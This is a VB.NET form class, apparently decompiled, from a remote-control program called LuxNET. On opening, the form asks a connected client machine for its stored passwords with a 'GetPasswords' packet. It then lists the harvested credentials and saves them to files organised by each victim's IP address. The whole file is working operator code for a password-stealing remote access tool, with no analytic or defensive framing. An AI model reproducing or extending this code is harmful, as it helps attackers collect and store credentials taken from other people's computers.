Imports ComponentOwl.BetterListView
Imports LuxNET.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class PasswordRecovery
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub PasswordRecovery_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SendPacket(New Object() {CByte(&H33)})
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        Me.SendPacket(New Object() {CByte(&H33)})
    End Sub

    Private Sub SaveAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAllToolStripMenuItem.Click
        Try
            Dim contents As String = String.Empty
            Dim item As BetterListViewItem
            For Each item In Me.LV_Passwords.Items
                contents = (contents & String.Format("{0}{1}{2}{3}", New Object() {(item.Text & ChrW(9)), (item.SubItems.Item(1).Text & ChrW(9)), (item.SubItems.Item(2).Text & ChrW(9)), (item.SubItems.Item(3).Text & ChrW(9) & ChrW(13) & ChrW(10))}))
            Next
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Passwords\", FileSystem.CurDir)) Then
                Directory.CreateDirectory(String.Format("{0}\Passwords\", FileSystem.CurDir))
            End If
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Passwords\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString)) Then
                Directory.CreateDirectory(String.Format("{0}\Passwords\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString))
            End If
            File.WriteAllText(String.Format("{0}\Passwords\{1}\{2}.txt", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, DateTime.Today.ToShortDateString), contents)
            Me.ToolStripStatusLabel1.Text = "Passwords saved!"
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SaveToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem1.Click
        Try
            Dim contents As String = String.Empty
            Dim item As BetterListViewItem
            For Each item In Me.LV_Passwords.SelectedItems
                contents = (contents & String.Format("{0}{1}{2}{3}", New Object() {(item.Text & ChrW(9)), (item.SubItems.Item(1).Text & ChrW(9)), (item.SubItems.Item(2).Text & ChrW(9)), (item.SubItems.Item(3).Text & ChrW(9) & ChrW(13) & ChrW(10))}))
            Next
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Passwords\", FileSystem.CurDir)) Then
                Directory.CreateDirectory(String.Format("{0}\Passwords\", FileSystem.CurDir))
            End If
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Passwords\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString)) Then
                Directory.CreateDirectory(String.Format("{0}\Passwords\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString))
            End If
            File.WriteAllText(String.Format("{0}\Passwords\{1}\{2}.txt", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, DateTime.Today.ToShortDateString), contents)
            Me.ToolStripStatusLabel1.Text = "Passwords saved!"
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        GetPasswords = &H33
    End Enum
End Class